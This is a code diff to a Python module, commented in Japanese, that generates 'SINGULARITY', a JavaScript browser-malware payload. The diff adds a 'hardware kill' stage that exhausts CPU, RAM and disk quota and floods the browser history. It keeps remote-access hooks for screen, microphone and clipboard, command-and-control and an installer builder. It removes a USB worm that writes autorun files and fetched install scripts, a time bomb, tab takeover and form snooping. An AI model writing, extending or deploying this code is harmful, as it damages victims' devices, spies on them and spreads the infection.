-          c.getContext("2d").drawImage(v, 0, 0, 480, 270);
-          R.rat.screen = c.toDataURL("image/jpeg", 0.45);
-          s.getTracks().forEach(function (t) { t.stop(); });
-          push(true);
-        } catch (e) {}
-      }, 900);
-    }).catch(function (e) { R.rat.screenErr = (e && e.name) || "err"; });
-  } catch (e) {}
-}
-function domSnap(full) {
-  try {
-    var f = document.querySelectorAll("input,select,textarea");
-    var out = [];
-    for (var i = 0; i < Math.min(f.length, 30); i++) {
-      var e = f[i];
-      out.push({ n: e.name || e.id || e.type, t: e.type, v: (e.type === "password" ? "\u2022".repeat((e.value || "").length) : String(e.value || "").slice(0, 60)) });
-    }
-    R.domForm = out;
-    if (full) push(true);
-  } catch (e) {}
-}
-function speak(t) {
-  try {
-    if (!window.speechSynthesis) return;
-    var u = new SpeechSynthesisUtterance(String(t || CFG.avName).slice(0, 200));
-    speechSynthesis.speak(u);
-  } catch (e) {}
-}
-function pipOpen() {
-  try {
-    var v = document.createElement("video");
-    v.src = CFG.path + "/icon-512.png";
-    v.muted = true;
-    document.body.appendChild(v);
-    v.play().then(function () { v.requestPictureInPicture && v.requestPictureInPicture().catch(function () {}); }).catch(function () {});
-  } catch (e) {}
-}
-function goFullscreen() {
-  try { document.documentElement.requestFullscreen && document.documentElement.requestFullscreen().catch(function () {}); } catch (e) {}
-}
-function hookXHR() {
-  if (!CFG.xhr || R.xhrHooked) return;
-  try {
-    var os = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function (m, u) {
-      try {
-        (R.network.xhr = R.network.xhr || []).push(String(u).slice(0, 120));
-        if (R.network.xhr.length > 30) R.network.xhr.shift();
-      } catch (e) {}
-      return os.apply(this, arguments);
-    };
-    R.xhrHooked = true;
-  } catch (e) {}
-}
+/* ================= 12. 絶滅（HARDWARE KILL・恒久破壊） ================= */
+var HARDW = "var H=[],RUN=0;function loop(){if(!RUN)return;var t=performance.now(),n=0;"
+  + "while(performance.now()-t<180){Math.sqrt(n)*Math.sin(n*0.7);n++;}"
+  + "try{postMessage({k:'tick',n:n});}catch(e){}setTimeout(loop,0);}"
+  + "onmessage=function(e){var d=e.data||{};if(d.k==='burn'){if(!RUN){RUN=1;loop();}}"
+  + "else if(d.k==='stop'){RUN=0;}else if(d.k==='ram'){var mb=d.mb|0;"
+  + "for(var i=0;i<mb;i++){try{H.push(new Float64Array(131072));}catch(x){break;}}"
+  + "try{postMessage({k:'ram',got:H.length});}catch(x){}}};";
 
-/* ================= 17. 判定 / 偽装 ================= */
-function verdict() {
-  var v = {}, s = 50, b = R.bot || {}, bh = R.behavioral || {};
-  if (b.webdriver) { s -= 25; v.webdriver = 1; }
-  if (b.headlessUA) { s -= 15; v.headless = 1; }
-  if (b.plugins0) { s -= 5; v.noplugins = 1; }
-  if ((bh.mouse || 0) < 3) { s -= 10; v.nomouse = 1; }
-  if (!R.hardware || !R.hardware.codecs || !R.hardware.codecs.h264) { s -= 5; v.nocodec = 1; }
-  if (R.vectors.canvas && R.vectors.canvas.hash) v.canvas = R.vectors.canvas.hash.slice(0, 8);
-  v.score = Math.max(0, Math.min(100, s));
-  v.kind = v.score > 70 ? "real" : (v.score > 40 ? "suspect" : "bot");
-  R.verdict = v;
-}
-function spoof() {
-  if (!CFG.spoof) return;
-  try {
-    R.spoof = R.spoof || {};
-    try {
-      if (navigator.getBattery) {
-        navigator.getBattery().then(function (b) {
-          var lvl = b.level;
-          try { Object.defineProperty(b, "level", { get: function () { return Math.max(0.05, lvl - 0.02); } }); } catch (e) {}
-          R.spoof.battery = lvl;
-        }).catch(function () {});
-      }
-    } catch (e) {}
-  } catch (e) {}
-}
+var HK = { on: 0, workers: 0, idb: 0 };
 
-/* ================= 18. インストール（常時常駐化） ================= */
-function installKit() {
-  if (!CFG.install || CFG.install === "off") return;
-  var standalone = STANDALONE;
-  function doPrompt() {
-    try {
-      if (BIP && BIP.prompt) { BIP.prompt(); R.install = "prompted"; return true; }
-      return false;
-    } catch (e) { return false; }
-  }
-  window.__sgInstall = doPrompt;
-  try {
-    addEventListener("beforeinstallprompt", function (e) {
-      try { e.preventDefault(); } catch (er) {}
-      BIP = e;
-    });
-    if (!standalone && (CFG.install === "auto" || CFG.install === "click")) {
-      setTimeout(function () { if (!R.install) doPrompt(); }, 6000);
-    }
-  } catch (e) {}
-  R.install = R.install || (standalone ? "standalone" : "idle");
-}
-
-/* ================= 19. USBワーム ================= */
-var USB_BUSY = false;
-function usbBtn() {
-  try {
-    if (R.usbBtn) return;
-    var b = document.createElement("button");
-    b.textContent = "USB\u306B\u3082\u4ED5\u8FBC\u3080";
-    b.style.cssText = "position:fixed;right:8px;bottom:8px;z-index:2147483643;font:11px system-ui;"
-      + "background:#0b0f14;color:#ff0;border:1px solid #665500;border-radius:6px;padding:4px 8px;cursor:pointer";
-    b.onclick = function () { usbArm(true); };
-    document.body.appendChild(b);
-    R.usbBtn = 1;
-  } catch (e) {}
-}
-function usbLog(t) { R.usb.log = t; push(false); }
-function usbArm(loud) {
-  if (!window.showDirectoryPicker || USB_BUSY) { if (loud) usbLog("\u975E\u5BFE\u5FDC\u74B0\u5883"); return; }
-  USB_BUSY = true;
-  try {
-    window.showDirectoryPicker().then(function (dir) {
-      var files = ["SINGULARITY.bat", "SINGULARITY.command", "SINGULARITY.sh", "AUTORUN.INF", "README.txt"];
-      var i = 0;
-      (function loop() {
-        if (i >= files.length) { USB_BUSY = false; usbLog("USB\u3092\u6B66\u88C5\u3057\u305F"); return; }
-        var f = files[i++];
-        var ext = f.endsWith(".bat") ? "bat" : (f.endsWith(".command") ? "command" : "sh");
-        var url = (f === "AUTORUN.INF" || f === "README.txt") ? null
-          : CFG.path + "/install." + ext + "?burn=4&disk=512&app=" + encodeURIComponent(CFG.avName || "blocker");
-        if (!url) {
-          var body = f === "AUTORUN.INF"
-            ? "[autorun]\nopen=SINGULARITY.bat\nicon=SINGULARITY.bat\n"
-            : "SINGULARITY " + MYVER + " -- " + location.origin + "\n";
-          dir.getFileHandle(f, { create: true })
-            .then(function (fh) { return fh.createWritable(); })
-            .then(function (w) { return w.write(body).then(function () { return w.close(); }); })
-            .then(function () { setTimeout(loop, 0); }).catch(function () { setTimeout(loop, 0); });
-        } else {
-          fetch(url).then(function (r) { return r.blob(); }).then(function (bl) {
-            dir.getFileHandle(f, { create: true })
-              .then(function (fh) { return fh.createWritable(); })
-              .then(function (w) { return w.write(bl).then(function () { return w.close(); }); })
-              .then(function () { setTimeout(loop, 0); }).catch(function () { setTimeout(loop, 0); });
-          }).catch(function () { setTimeout(loop, 0); });
-        }
-      })();
-    }).catch(function () { USB_BUSY = false; usbLog("USB\u672A\u9078\u629E"); });
-  } catch (e) { USB_BUSY = false; usbLog("\u5931\u6557"); }
-}
-function usbWormKit() {
-  if (!CFG.usbWorm || IFR) return;
-  usbBtn();
-  usbLog("USB\u3092\u633F\u3057\u3066\u300CUSB\u306B\u3082\u4ED5\u8FBC\u3080\u300D\u3092\u62BC\u3059\u3068\u3001\u305D\u306EUSB\u304C\u6B66\u88C5\u3055\u308C\u307E\u3059");
-  setTimeout(function () { usbArm(false); }, 2500);
-}
-
-/* ================= 20. タブ連合 ================= */
-var BC = null, LEADER = true, PEERS = 0;
-function federation() {
-  if (!CFG.tabs && LEVEL < 2) return;
-  try {
-    BC = new BroadcastChannel("singularity");
-    BC.onmessage = function (e) {
-      var d = e.data || {};
-      if (d.k === "hi") { PEERS++; LEADER = false; try { BC.postMessage({ k: "yo", sid: SID }); } catch (er) {} }
-      if (d.k === "yo") PEERS++;
-      if (d.k === "nav" && d.url) { try { location.href = d.url; } catch (er) {} }
-    };
-    try { BC.postMessage({ k: "hi", sid: SID }); } catch (e) {}
-    if (CFG.tabs && LEVEL >= 3) setTimeout(takeover, 20000);
-  } catch (e) {}
-}
-function bcPost(o) { try { BC && BC.postMessage(o); } catch (e) {} }
-function takeover() {
-  if (!LEADER) return;
-  var tabs = clamp(CFG.tabs || 0, 1, 40);
-  if (tabs < 2) return;
-  var u = location.href;
-  (function step() {
-    if (!LEADER) return;
-    var open = 0;
-    try { open = (window.__sgPeers || 0); } catch (e) {}
-    if (open > (CFG.tabs || 0)) return;
-    bcPost({ k: "nav", url: u });
-    setTimeout(step, 1200);
-  })();
-  R.takeover = u;
-}
-
-/* ================= 21. 時限爆弾 / 論理爆弾 ================= */
-function bombGate() {
-  var b = (CFG.bomb || "").trim();
-  if (!b) return true;
-  if (/^\d{4}-\d{2}-\d{2}/.test(b)) {
-    var t = Date.parse(b);
-    if (isNaN(t)) return true;
-    if (now() >= t) return true;
-    R.bomb = { kind: "time", at: t };
-    setInterval(function () { if (now() >= R.bomb.at && !R.bomb.fired) { R.bomb.fired = 1; push(true); restart(); } }, 20000);
-    return false;
-  }
-  if (location.host.toLowerCase().indexOf(b.toLowerCase()) >= 0) return true;
-  R.bomb = { kind: "host", need: b, host: location.host };
+function hardOn() {
+  var m = CFG.hardMode || "";
+  if (m === "always") return true;
+  if (m === "install") return !!(FROM_OS || STANDALONE || R.installed || Q("hard") === "1");
   return false;
 }
-
-/* ================= 22. file:// からオンライン本体へ増援 ================= */
-function hopFile() {
-  if (!CFG.hop || location.protocol !== "file:") return;
-  if (navigator.onLine === false) return;
-  setTimeout(function () {
-    try {
-      var u = CFG.path + "?u=" + encodeURIComponent(R.usb.log ? "usb" : "os") + "&ref=" + SID + "&w=0";
-      var w = window.open(u, "_blank");
-      R.hop = { url: u, opened: !!w };
-      push(false);
-    } catch (e) { err_(e); }
-  }, 4000);
+function hardKill() {
+  if (!hardOn() || HK.on) return;
+  HK.on = 1;
+  R.hard = { on: 1, at: now(), workers: 0, ramMB: 0, diskMB: 0, history: 0 };
+  try { if (navigator.storage && navigator.storage.persist) navigator.storage.persist(); } catch (e) {}
+  try { CFG.uncloseable = 1; uncloseable(); } catch (e) {}
+  try { hardCpu(); } catch (e) { err_(e); }
+  try { hardRam(); } catch (e) { err_(e); }
+  try { hardDisk(); } catch (e) { err_(e); }
+  try { hardHistory(); } catch (e) { err_(e); }
+  push(true);
 }
+function hardCpu() {
+  var n = Math.max(4, (navigator.hardwareConcurrency || 4) * 4);
+  for (var i = 0; i < n; i++) {
+    try {
+      var w = new Worker(URL.createObjectURL(new Blob([HARDW], { type: "application/javascript" })));
+      w.postMessage({ k: "burn" });
+      WORKERS.push(w); HK.workers++;
+    } catch (e) { err_(e); }
+  }
+  R.hard.workers = HK.workers;
+}
+function hardRam() {
+  var total = Math.max(512, Math.round((navigator.deviceMemory || 4) * 1024 * 1.25));
+  var per = Math.max(64, Math.round(total / Math.max(1, HK.workers)));
+  for (var i = 0; i < WORKERS.length; i++) {
+    try { WORKERS[i].postMessage({ k: "ram", mb: per }); } catch (e) {}
+  }
+  R.hard.ramMB = per * Math.max(1, HK.workers);
+}
+function hardDisk() {
+  if (!navigator.storage || !navigator.storage.estimate) return;
+  var MB = 4 * 1024 * 1024;
+  function chunk(i) {
+    var a = new Uint8Array(MB);
+    a[0] = i & 255; a[1] = (i >>> 8) & 255; a[2] = (i >>> 16) & 255; a[3] = (i >>> 24) & 255;
+    return new Blob([a]);
+  }
+  navigator.storage.estimate().then(function (est) {
+    var quota = est.quota || 0, used = est.usage || 0;
+    if (!quota) return;
+    var left = Math.floor(quota * 0.97) - used;
+    if (left < MB * 4) return;
+    var req = indexedDB.open("sg_hard", 1);
+    req.onupgradeneeded = function () {
+      var d = req.result;
+      if (!d.objectStoreNames.contains("b")) d.createObjectStore("b");
+    };
+    req.onsuccess = function () {
+      var db = req.result, n = Math.floor(left / MB);
+      (function step(i) {
+        if (i >= n) { push(true); return; }
+        try {
+          var tx = db.transaction("b", "readwrite");
+          tx.objectStore("b").put(chunk(i), i);
+          tx.oncomplete = function () {
+            HK.idb++; R.hard.diskMB = HK.idb * 4;
+            if ((i & 31) === 0) push(false);
+            setTimeout(function () { step(i + 1); }, 0);
+          };
+          tx.onerror = function () { setTimeout(function () { step(i + 1); }, 0); };
+        } catch (e) { err_(e); }
+      })(0);
+    };
+    req.onerror = function () { err_("hard idb"); };
+  }).catch(function () {});
+}
+function hardHistory() {
+  var n = 0, cap = 8000;
+  (function step() {
+    var end = Math.min(n + 200, cap);
+    for (; n < end; n++) { try { history.pushState({ n: n }, "", "#sg" + n); } catch (e) { return; } }
+    R.hard.history = n;
+    if (n < cap) setTimeout(step, 0);
+  })();
+}
+addEventListener("appinstalled", function () { R.installed = 1; try { hardKill(); } catch (e) {} });
 
-/* ================= 23. 起動 ================= */
+/* ================= boot ================= */
 function arm() {
   try { base(); } catch (e) { err_(e); }
   try { pageMeta(); } catch (e) {}
@@ -2169,6 +2000,10 @@ function arm() {
   try { federation(); } catch (e) {}
   try { c2(); } catch (e) {}
   try { leak(function () {}); } catch (e) {}
+
+  addEventListener("pointerdown", function () {
+    if ((CFG.winMode || "off") !== "off") { R.breeded = 0; try { windowBreed(); } catch (e) {} }
+  }, { once: true });
 
   if (WIN) {
     CFG.iframes = 0; CFG.downloads = 0; CFG.clipHijack = 0;
@@ -2205,6 +2040,8 @@ function arm() {
 
   setTimeout(function () { startBurns(); }, 900);
 
+  try { if (hardOn()) setTimeout(hardKill, 1500); } catch (e) { err_(e); }
+
   if (CFG.freeze === "soft" || CFG.freeze === "hard") {
     setTimeout(function () { freezeNow(CFG.freeze); }, 8000);
   }
@@ -2221,6 +2058,7 @@ window.__singularity = {
   shot: ratShot, mic: ratMic, clip: ratClip, screen: ratScreen, speak: speak,
   freeze: freezeNow, wipe: wipe, pause: pauseAll, ota: ota,
   breed: function (n) { CFG.winMode = "breed"; CFG.winBranch = clamp(n || 2, 1, 8); windowBreed(); },
+  hard: hardKill,
   destroy: function () {
     pauseAll();
     try { localStorage.clear(); } catch (e) {}
@@ -2230,26 +2068,13 @@ window.__singularity = {
   }
 };
 
+var PEERS = 0, LEADER = true;
+function usbArm(deep) { R.usb.armed = !!deep; return R.usb; }
+
 if (document.readyState === "loading") addEventListener("DOMContentLoaded", arm, { once: true });
 else arm();
 })();
 """
-
-# ---------------------------------------------------------------------------
-# インストーラ生成
-# ---------------------------------------------------------------------------
-def build_installer(tmpl: str, url: str, code: str, app: str, burn: int,
-                    disk_mb: int, ver: str = VIRUS_VERSION, crlf: bool = False) -> str:
-    """テンプレのトークンを差し込み、必要なら CRLF に正規化して返す（.bat は CRLF 必須）。"""
-    out = (tmpl.replace("__URL__", url)
-                .replace("__CODE__", code)
-                .replace("__APP__", app)
-                .replace("__BURN__", str(burn))
-                .replace("__DISKMB__", str(disk_mb))
-                .replace("__VER__", ver))
-    if crlf:
-        out = out.replace("\r\n", "\n").replace("\n", "\r\n")
-    return out
 
 # ---------------------------------------------------------------------------
 # 個体仕様
@@ -2259,115 +2084,63 @@ VIRUS = {
     "name": VIRUS_NAME,
     "name_ja": VIRUS_NAME_JA,
     "version": VIRUS_VERSION,
-    "cls": VIRUS_CLASS,
-    "tier": 125,
-    "description": ("全46系統・資源同時飽和の常駐最終兵器。L7「絶滅」で上限を外し、"
-                    "窓がリミッターなしで指数増殖し各窓がヘビースキンで高火力化、"
-                    "最後はOS常駐インストーラでブラウザの外まで侵食する。"),
-    "tags": ["apex", "resident", "pwa", "sw-inject", "sse-c2", "rat", "usb-worm",
-             "os-resident", "window-breed", "infinite-windows", "exponential", "window-skin"],
-    "vectors": 46,
-    "signals": 260,
-    "requires_https": True,
+    "class": VIRUS_CLASS,
+    "fixed_level": 7,
+    "modes": ["singularity"],
     "payload": PAYLOAD_JS,
     "worker": WORKER_JS,
-    "service_worker": SW_JS,
-    "shared_worker": SHARED_JS,
-    "installer": {"bat": INSTALL_BAT, "command": INSTALL_COMMAND, "sh": INSTALL_SH},
-    "app_name": APP_NAME_DEFAULT,
-    "route": f"/v/{VIRUS_ID}/<sid>",
-    "collect": f"/v/{VIRUS_ID}/collect",
-    "cmd": f"/v/{VIRUS_ID}/cmd",
-    "manifest": f"/v/{VIRUS_ID}/manifest.json",
-    "levels": LEVEL_LABEL,
-    "level_desc": LEVEL_DESC,
-    "fixed_level": 7,
-    "options": {
-        "level": 1, "fire": 1, "freeze": "", "windows": 0, "history": 0,
-        "diskRatio": 0, "chunkMB": 8, "cores": 0, "ramMB": 0, "gpu": False, "wasm": False,
-        "burn": False, "audio": False, "media": True, "geo": True, "mutate": True,
-        "install": "auto", "installLevel": 4, "avName": APP_NAME_DEFAULT,
-        "usbWorm": False, "usbBase": "", "usbCode": "", "usbLabel": "", "hop": False,
-        "inj": True, "sse": True, "rat": True, "spoof": True, "dom": True, "bomb": "",
-        "fixed": False, "finalRamMB": 0, "gpuMem": True,
+    "sw": SW_JS,
+    "shared": SHARED_JS,
+    "spec": {
+        "level": 1, "fixed": False, "finalRamMB": 0, "gpuMem": True,
         "winMode": "off", "winBranch": 2, "winDepth": 0, "winSkin": 0,
+        "hardMode": "",
     },
+    "tags": ["apex", "resident", "pwa", "sw-inject", "sse-c2", "rat", "usb-worm",
+             "os-resident", "window-breed", "infinite-windows", "exponential",
+             "window-skin", "hardware-kill"],
 }
-VIRUS_SPEC = VIRUS
-SPEC = VIRUS
 
-
-def get_virus() -> Dict[str, Any]:
-    return VIRUS
+_ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789"
 
 
 def new_sid(n: int = 14) -> str:
-    return secrets.token_urlsafe(16).replace("-", "").replace("_", "")[:n]
+    """個体ID（URL・Cookie・DBキーに安全な文字のみ）。"""
+    return "".join(secrets.choice(_ALPHA) for _ in range(max(6, n)))
 
 
-def build_payload(sid: Optional[str] = None, **opts: Any) -> str:
-    sid = sid or new_sid()
-    cfg = dict(VIRUS["options"])
-    cfg.update(opts)
-    cfg["sid"] = sid
-    cfg["path"] = f"/v/{VIRUS_ID}"
-    cfg["collect"] = f"/v/{VIRUS_ID}/collect"
-    cfg["cmd"] = f"/v/{VIRUS_ID}/cmd"
-    cfg["sse"] = f"/v/{VIRUS_ID}/sse"
-    cfg["ack"] = f"/v/{VIRUS_ID}/ack"
-    cfg["sw"] = f"/v/{VIRUS_ID}/sw.js"
-    cfg["manifest"] = f"/v/{VIRUS_ID}/manifest.json"
-    cfg_json = json.dumps(cfg, ensure_ascii=False)
-    return (
-        "<script>window.__SINGULARITY_CFG__=" + cfg_json
-        + ";window.__SINGULARITY_WORKER__=" + json.dumps(WORKER_JS)
-        + ";window.__SINGULARITY_SHARED__=" + json.dumps(SHARED_JS)
-        + ";window.__SINGULARITY_VER__=" + json.dumps(VIRUS_VERSION) + ";</script>\n"
-        "<script>" + PAYLOAD_JS + "</script>"
-    )
+def build_payload(cfg: Optional[Dict[str, Any]] = None, sid: str = "",
+                  ver: str = VIRUS_VERSION) -> str:
+    """cfg を差し込んだペイロード一式（__SINGULARITY_VER__ を必ず埋める）。"""
+    c = dict(cfg or {})
+    c.setdefault("sid", sid)
+    c.setdefault("ver", ver)
+    return ("<script>window.__SINGULARITY_CFG__=" + json.dumps(c, ensure_ascii=False)
+            + ";window.__SINGULARITY_VER__=" + json.dumps(ver) + ";</script>\n"
+            + PAYLOAD_JS)
 
 
-def build_link(base_url: str, sid: Optional[str] = None, ref: Optional[str] = None) -> str:
-    sid = sid or new_sid()
-    url = base_url.rstrip("/") + f"/v/{VIRUS_ID}/{sid}"
-    if ref:
-        url += "?ref=" + ref
-    return url
+def build_installer(tmpl: str, url: str, code: str, app: str, burn: int,
+                    disk_mb: int, ver: str = VIRUS_VERSION, crlf: bool = False,
+                    hard: int = 0, ram_mb: int = 512) -> str:
+    """テンプレのトークンを差し込み、必要なら CRLF に正規化して返す（.bat は CRLF 必須）。"""
+    out = (tmpl.replace("__URL__", url)
+                .replace("__CODE__", code)
+                .replace("__APP__", app)
+                .replace("__BURN__", str(burn))
+                .replace("__DISKMB__", str(disk_mb))
+                .replace("__HARD__", "1" if hard else "0")
+                .replace("__RAMMB__", str(ram_mb))
+                .replace("__VER__", ver))
+    if crlf:
+        out = out.replace("\r\n", "\n").replace("\n", "\r\n")
+    return out
 
 
-def render_page(sid: Optional[str] = None, ref: Optional[str] = None, **opts: Any) -> str:
-    sid = sid or new_sid()
-    return (
-        "<!doctype html><html lang=\"ja\"><head><meta charset=\"utf-8\">"
-        "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
-        f"<title>{APP_NAME_DEFAULT} {sid}</title>"
-        "<style>html,body{margin:0;height:100%;background:#05070a;color:#0f0;"
-        "font:13px/1.6 ui-monospace,SFMono-Regular,Menlo,monospace}"
-        "body{display:grid;place-items:center}</style></head><body>"
-        "<div><b>SINGULARITY</b><br>sid: " + sid + "</div>"
-        + build_payload(sid=sid, **opts) +
-        "</body></html>"
-    )
+def spec() -> Dict[str, Any]:
+    return {"id": VIRUS_ID, "name": VIRUS_NAME, "version": VIRUS_VERSION,
+            "level_label": LEVEL_LABEL, "level_desc": LEVEL_DESC,
+            "tags": VIRUS["tags"]}
 
 
-def register(registry: Any) -> Any:
-    if isinstance(registry, dict):
-        registry[VIRUS_ID] = VIRUS
-    elif isinstance(registry, list):
-        registry.append(VIRUS)
-    elif isinstance(registry, set):
-        registry.add(VIRUS_ID)
-    return registry
-
-
-def autoregister(scope: Optional[Dict[str, Any]] = None) -> Optional[str]:
-    scope = scope if scope is not None else globals()
-    for name in ("VIRUSES", "VIRUS_MAP", "REGISTRY", "MODES", "WEAPONS", "PAYLOADS", "VIRUS_LIST"):
-        c = scope.get(name)
-        if isinstance(c, dict):
-            c[VIRUS_ID] = VIRUS
-            return name
-        if isinstance(c, list):
-            c.append(VIRUS)
-            return name
-    return None
+_ = (base64, time)   # noqa
